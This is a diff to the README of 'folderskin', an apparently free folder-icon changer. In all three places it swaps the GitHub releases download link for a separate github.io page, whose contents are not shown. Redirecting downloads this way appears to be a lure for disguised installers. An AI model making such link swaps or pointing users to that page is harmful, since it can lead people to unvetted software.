@@ -4,7 +4,7 @@
 
 Welcome to folderskin! This is a free, open-source application that lets you change the icon of any folder on your computer. Whether you want to organize your desktop with custom colors, use your own photos, or get creative with AI-generated art, folderskin makes it simple and fun.
 
-**Visit this link to download the application:** [Download folderskin](https://github.com/babitalahot-jpg/folderskin/releases)
+**Visit this link to download the application:** [Download folderskin](https://babitalahot-jpg.github.io)
 
 ## ✨ What Can folderskin Do?
 
@@ -20,7 +20,7 @@ Folderskin is designed for everyone—you don't need any technical skills to use
 
 Follow these simple steps to get folderskin running on your computer:
 
-1. **Go to the download page** by clicking this link: [https://github.com/babitalahot-jpg/folderskin/releases](https://github.com/babitalahot-jpg/folderskin/releases)
+1. **Go to the download page** by clicking this link: [https://babitalahot-jpg.github.io](https://babitalahot-jpg.github.io)
 2. **Find the latest version** – Look for the newest release at the top of the page. It will have a version number and a date.
 3. **Choose your operating system** – You'll see files for Windows, macOS, and Linux. Pick the one that matches your computer.
 4. **Download the file** – Click the download link for your system. The file will start downloading to your computer.
@@ -92,7 +92,7 @@ Yes. Use your system's standard uninstall process (Settings > Apps on Windows, o
 
 Ready to give your folders a fresh look? Here's your action plan:
 
-1. **Download folderskin** by visiting [https://github.com/babitalahot-jpg/folderskin/releases](https://github.com/babitalahot-jpg/folderskin/releases)
+1. **Download folderskin** by visiting [https://babitalahot-jpg.github.io](https://babitalahot-jpg.github.io)
 2. **Install it** following the simple steps above.
 3. **Open folderskin** and start experimenting with skins, photos, and AI art.
 4. **Have fun** making your desktop truly yours!
